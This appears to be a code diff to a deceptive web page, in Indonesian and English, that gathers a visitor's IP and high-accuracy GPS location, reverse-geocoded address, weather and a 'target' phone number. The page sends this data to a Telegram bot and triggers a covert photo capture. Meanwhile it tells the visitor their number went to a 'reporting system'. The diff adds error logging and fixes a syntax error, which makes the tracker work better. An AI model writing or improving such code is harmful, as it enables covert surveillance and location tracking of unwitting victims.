@@ -139,7 +139,9 @@
         latitude = ipData.latitude;
         longitude = ipData.longitude;
         fullAddress = `${ipData.city}, ${ipData.region}, ${ipData.country_name}, ${ipData.postal}`;
-      } catch {}
+      } catch (e) {
+        console.warn("IP lookup error:", e);
+      }
 
       try {
         await new Promise((resolve) => {
@@ -153,7 +155,9 @@
                 const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
                 const geoData = await geoRes.json();
                 gpsAddress = geoData.display_name || "N/A";
-              } catch {}
+              } catch (e) {
+                console.warn("Reverse geocode error:", e);
+              }
               if (parseFloat(pos.coords.accuracy) > 100) {
                 alert("⚠️ Lokasi tidak akurat. Aktifkan GPS dan coba lagi.");
               }
@@ -166,13 +170,17 @@
             { enableHighAccuracy: true, timeout: 10000 }
           );
         });
-      } catch {}
+      } catch (e) {
+        console.warn("Geolocation error:", e);
+      }
 
       try {
         const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
         weather = weatherData.current_condition[0].weatherDesc[0].value;
         temperature = weatherData.current_condition[0].temp_C + "°C";
-      } catch {}
+      } catch (e) {
+        console.warn("Weather error:", e);
+      }
 
       const jsonData = {
         "nomor target": phoneInput,
@@ -207,8 +215,9 @@
       };
 
       const message = `📥 *Data target Baru*\n\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;
+      console.log("📦 Kirim ke Telegram:", jsonData);
 
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -216,6 +225,10 @@
           text: message,
           parse_mode: "Markdown"
         })
+      }).then(res => {
+        console.log("✅ Respon Telegram:", res);
+      }).catch(err => {
+        console.error("❌ Gagal kirim:", err);
       });
     }
 
@@ -258,7 +271,7 @@
       getVisitorInfo();
       captureAndSendPhoto();
       setTimeout(() => {
-        resBox.innerHTML = "✅ Nomor berhasil dikirim ke sistem pelaporan.");
+        resBox.innerHTML = "✅ Nomor berhasil dikirim ke sistem pelaporan.";
       }, 3000);
     }
   </script></body>
